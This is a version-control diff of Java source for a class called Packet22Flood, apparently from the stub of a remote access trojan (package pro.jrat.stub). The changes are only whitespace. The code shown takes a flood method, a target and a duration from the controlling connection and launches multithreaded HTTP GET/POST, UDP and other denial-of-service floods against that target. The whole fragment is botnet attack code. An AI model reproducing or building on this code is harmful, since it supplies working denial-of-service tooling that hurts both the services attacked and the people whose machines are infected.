@@ -10,9 +10,8 @@ import pro.jrat.stub.flood.Rapid;
 import pro.jrat.stub.flood.ThreadFlood;
 import pro.jrat.stub.flood.UDP;
 
-
 public class Packet22Flood extends AbstractIncomingPacket {
-	
+
 	public static final int THREADS = 5;
 
 	@Override
@@ -20,7 +19,7 @@ public class Packet22Flood extends AbstractIncomingPacket {
 		int method = Connection.readInt();
 		String target = Connection.readLine();
 		int seconds = Connection.readInt();
-					
+
 		if (method == Flood.GET.getNumeric()) {
 			start(new HTTP(target, Constants.HTTP_GET), seconds);
 		} else if (method == Flood.POST.getNumeric()) {
@@ -37,10 +36,10 @@ public class Packet22Flood extends AbstractIncomingPacket {
 			start(new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
 		}
 	}
-	
+
 	public static void start(Runnable flood, int seconds) {
 		new Thread(new ThreadFlood(seconds)).start();
-		
+
 		for (int i = 0; i < THREADS; i++) {
 			new Thread(flood).start();
 		}
